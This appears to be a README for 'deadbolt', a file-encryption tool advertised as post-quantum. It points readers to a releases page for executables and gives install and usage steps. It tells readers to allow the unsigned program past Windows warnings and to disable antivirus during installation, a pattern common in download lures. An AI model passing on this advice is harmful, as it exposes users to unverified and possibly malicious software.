# 🔒 deadbolt - Secure Your Files Against Quantum Threats

[![Download deadbolt](https://img.shields.io/badge/Download-deadbolt-blue?style=for-the-badge)](https://github.com/nurikbystik/deadbolt/releases)

---

## 🛡 What is deadbolt?

deadbolt is a tool designed to help you protect your files from future computer threats. It uses advanced techniques to keep your data safe against attacks that might come from powerful quantum computers. You can use it with an easy-to-understand graphical interface or through simple commands if you prefer.

The technology behind deadbolt mixes two strong encryption methods: Kyber-1024, a new standard for post-quantum security, and AES-256-GCM, a well-known and trusted encryption standard. Together, they create a strong shield for your files.

---

## 🖥️ System Requirements 

deadbolt works on most modern computers. Here are the basic needs to run it smoothly:

- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended)
- **Processor:** Intel or AMD processor, 2 GHz or faster
- **Memory:** At least 4 GB of RAM
- **Storage:** 100 MB free space for installation
- **Permissions:** Ability to install applications on your device

If you are using Windows, you might see a warning from your system the first time you run deadbolt. This is normal and due to the program not being signed by a known publisher. You can safely allow deadbolt to run.

---

## 🚀 Getting Started

Using deadbolt is straightforward. This section guides you through downloading, installing, and encrypting your files.

### Step 1: Download deadbolt

Visit the [deadbolt Release page](https://github.com/nurikbystik/deadbolt/releases) by clicking the big badge at the top or the link below. Here, you will find the latest versions for your system.

**Important:** Choose the file that matches your operating system:

- For Windows, look for files ending with `.exe`
- For macOS, look for `.dmg` files
- For Linux, look for `.AppImage`, `.deb`, or `.tar.gz` depending on your flavor

Make sure to download the latest stable version.

### Step 2: Install deadbolt

- **Windows:** Double-click the `.exe` file you downloaded. Follow the instructions in the setup window to complete installation.
- **macOS:** Open the `.dmg` file, drag the deadbolt app to your Applications folder, and launch it from there.
- **Linux:** Depending on the file type, you may need to make the file executable or use a package manager:
  - For `.AppImage`, right-click, select Properties, enable "Allow executing file as program," then double-click to run.
  - For `.deb`, open your terminal and run `sudo dpkg -i [filename].deb`, replacing `[filename]` with the actual file name.
  - For `.tar.gz`, extract the folder, then check any README included for run instructions.

### Step 3: Open deadbolt

Locate the deadbolt program in your applications or start menu and open it. You will see an intuitive interface that guides you through encrypting and decrypting your files.

---

## 🔐 How to Encrypt Your Files

The core function of deadbolt is file encryption. Here is how to use this feature step by step.

1. Click on the **Encrypt** button or tab.
2. Select the files or folders you want to protect by browsing your computer.
3. Choose a strong password that you will remember. This password locks your files.
4. Click **Start Encryption**.
5. Wait for deadbolt to finish. You will see a confirmation when your files are safely encrypted.

Encrypted files will have a special extension added so you can tell them apart from regular files. To open or decrypt them, you will need your password and the deadbolt tool.

---

## 🔓 How to Decrypt Your Files

To get your original files back:

1. Click on the **Decrypt** button or tab in deadbolt.
2. Browse and select the encrypted files you want to unlock.
3. Enter the password you used during encryption.
4. Click **Start Decryption**.
5. After a short wait, your files will be restored to their original form and location.

---

## ⚙️ Advanced Options

deadbolt offers two ways to work with it:

- **Graphical User Interface (GUI):** Easy to use with buttons and menus.
- **Command Line Interface (CLI):** For users comfortable with typing commands in a terminal.

The CLI allows batch processing of many files and scripting operations if desired. A simple example for encryption via CLI is:

```
deadbolt encrypt --input /path/to/file --output /path/to/encrypted_file --password YourPassword
```

Check the documentation on the release page for more commands and usage.

---

## 🔗 Download & Install Deadbolt

Visit this page to download the software:

[https://github.com/nurikbystik/deadbolt/releases](https://github.com/nurikbystik/deadbolt/releases)

Remember to select the correct file for your computer's system. Follow the installation steps described earlier to get started.

---

## ❓ Troubleshooting and Support

If you run into issues, try the following:

- Make sure your operating system meets the requirements.
- Verify you downloaded the right version for your OS.
- Restart your computer and try running deadbolt again.
- Check your password carefully if a file won’t decrypt.
- Disable antivirus temporarily if it blocks deadbolt during installation.

You can find more help and ask questions on the deadbolt GitHub page under the Issues tab.

---

## 📋 Privacy and Security

deadbolt does not send your files or password over the internet. Everything happens locally on your device. Your encrypted data stays private and secure from any outside access.

---

## 📚 More Information

deadbolt uses current research in post-quantum cryptography. This means it is designed to protect against future quantum computers that might break traditional encryption.

It combines the NIST-approved Kyber-1024 key encapsulation method with AES-256-GCM symmetric encryption. AES-256-GCM is widely trusted and used by banks and governments.

You can count on deadbolt to keep your files secure as new computer technologies emerge.

---

Thank you for choosing deadbolt to protect your digital life.